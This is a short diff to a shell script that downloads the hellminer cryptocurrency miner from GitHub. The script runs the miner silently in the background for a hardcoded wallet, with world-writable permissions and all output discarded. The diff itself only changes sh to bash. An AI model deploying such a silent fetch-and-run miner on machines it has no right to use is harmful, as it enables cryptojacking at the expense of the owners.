@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 user="RMiRV2rGDffq52FW43oqLCuTzumdVU3zAH"
 mode="${1:-0}"
@@ -14,6 +14,6 @@ wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer
 cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
 cmd="./hm -u ${user} -p d=16384S >/dev/null 2>&1"
 
-[ "$mode" == "0" ] && sh <(echo "$cmd") || sh <(echo "$cmd") &
+[ "$mode" == "0" ] && bash <(echo "$cmd") || bash <(echo "$cmd") &
 
 
